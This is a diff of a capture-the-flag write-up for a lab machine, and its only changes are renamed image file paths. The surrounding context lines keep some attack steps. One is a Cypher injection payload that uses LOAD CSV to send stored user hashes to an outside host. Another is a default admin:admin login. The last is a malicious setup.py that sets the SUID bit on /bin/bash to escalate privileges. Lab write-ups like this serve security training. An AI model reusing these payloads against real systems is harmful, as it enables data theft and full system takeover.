@@ -21,7 +21,7 @@ Web Exploit for RCE it seems. We have to add `only4you.htb` to our `/etc/hosts` 
 
 Port 80 is hosting a corporate website.
 
-<figure><img src="../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (56) (5).png" alt=""><figcaption></figcaption></figure>
 
 At the very bottom, it seems that we can download a trial of their application. This redirects us to the `beta.only4you.htb` domain.
 
@@ -278,11 +278,11 @@ I tried some weak credentials, and found that `admin:admin` worked. This was som
 
 Within the Employees tab, we can search for the names of employees.
 
-<figure><img src="../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (55) (1).png" alt=""><figcaption></figcaption></figure>
 
 There's the port for `neo4j` open on the machine, so I assumed that some kind of query injection was next. Also, we can see the Tasks on the main dashboard page to verify this.
 
-<figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (67) (3).png" alt=""><figcaption></figcaption></figure>
 
 As usual, Hacktricks has a whole page to get us started.
 
@@ -315,11 +315,11 @@ Great! We have confirmed that we have injection. Now, we can try to extract hash
 ' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.5:5000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
 ```
 
-<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (51) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can crack these hashes on CrackStation.
 
-<figure><img src="../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (65) (4).png" alt=""><figcaption></figcaption></figure>
 
 With this password, we can `ssh` in as `john`! Then, we can grab the user flag.
 
@@ -355,7 +355,7 @@ The exploit details how we have to create a malicious repository on this Gogs in
 
 I just modifed the `setup.py` file to run `os.system("chmod u+s /bin/bash")`. Afterwards, we need to build the package using `python3 -m build`. Afterwards, we need to upload the file. I created a new repository on the Gogs instance and uploaded it there.
 
-<figure><img src="../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (63) (3).png" alt=""><figcaption></figcaption></figure>
 
 Then, we can just run the command to download it.
 
